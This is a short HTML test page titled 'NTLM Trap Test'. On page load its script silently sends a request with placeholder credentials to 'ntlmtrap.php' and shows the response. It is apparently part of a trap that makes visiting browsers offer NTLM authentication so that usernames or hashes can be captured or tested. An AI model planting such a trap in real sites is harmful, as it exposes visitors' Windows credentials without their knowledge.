<!DOCTYPE html>
<html lang="en">
	<head>
	<title>NTLM Trap Test</title>
	</head>
	<body>
	<div id="demo"></div>
		<script>
			function loadUser() {
				var xhttp = new XMLHttpRequest();
				xhttp.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						document.getElementById("demo").innerHTML =
						this.responseText;
					}
				};
				xhttp.open("GET", "ntlmtrap.php", true, "_", "");
				xhttp.send();
			}
			loadUser();
		</script>
	</body>
</html>